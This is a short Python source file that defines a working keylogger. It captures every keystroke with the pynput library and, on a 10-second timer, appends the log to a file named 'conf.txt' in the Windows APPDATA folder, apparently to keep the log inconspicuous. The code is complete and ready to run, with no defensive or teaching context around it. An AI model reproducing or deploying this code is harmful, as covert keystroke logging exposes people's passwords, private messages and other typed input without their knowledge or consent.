#!/usr/bin/python
import pynput.keyboard
import threading
import os


class KeyLogger:
    def __init__(self):
        self.log = ""
        self.path = os.environ["APPDATA"] + "\\conf.txt"
        self.listener = None
        self.timer = None

    def process_keys(self, key):
        try:
            if hasattr(key, "char") and key.char is not None:
                self.log += str(key.char)
            elif key == key.space:
                self.log += " "
            elif key == key.enter:
                self.log += "\n"
            else:
                self.log += f" [{key}] "
        except Exception as e:
            self.log += f" [Error: {e}] "

    def report(self):
        try:
            with open(self.path, "a") as file:
                file.write(self.log)
                self.log = ""
        except Exception as e:
            print(f"Ошибка записи в файл: {e}")
        self.timer = threading.Timer(10, self.report)
        self.timer.start()

    def start(self):
        self.listener = pynput.keyboard.Listener(on_press=self.process_keys)
        with self.listener:
            self.report()
            self.listener.join()

    def stop(self):
        if self.listener:
            self.listener.stop()
        if self.timer:
            self.timer.cancel()
